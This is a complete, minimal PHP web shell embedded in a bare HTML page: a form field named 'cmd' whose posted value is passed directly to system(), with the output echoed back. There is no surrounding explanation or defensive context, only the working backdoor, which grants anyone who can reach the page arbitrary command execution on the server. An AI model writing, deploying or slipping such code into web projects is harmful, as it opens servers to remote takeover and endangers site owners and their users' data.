<HTML><BODY>
<FORM METHOD="POST" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?
if($_POST['cmd']) {
  system($_POST['cmd']);
  }
?>
</pre>
</BODY></HTML>